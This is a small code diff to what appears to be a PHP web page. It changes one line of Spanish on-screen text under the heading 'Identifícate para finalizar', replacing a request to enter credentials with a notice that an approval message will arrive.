@@ -61,7 +61,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             </svg>
         </div>
         <p style="font-size: 16px; color: #1a1a1a; line-height: 1.5; font-weight: 600; margin: 0;">Identifícate para finalizar</p>
-        <p style="font-size: 13px; color: #6b7280; line-height: 1.5; margin-top: 6px;">Ingresa tus credenciales para continuar con el proceso</p>
+        <p style="font-size: 13px; color: #6b7280; line-height: 1.5; margin-top: 6px;">Recibiras un mensaje de aprobación</p>
     </div>
 </div>
 <script>
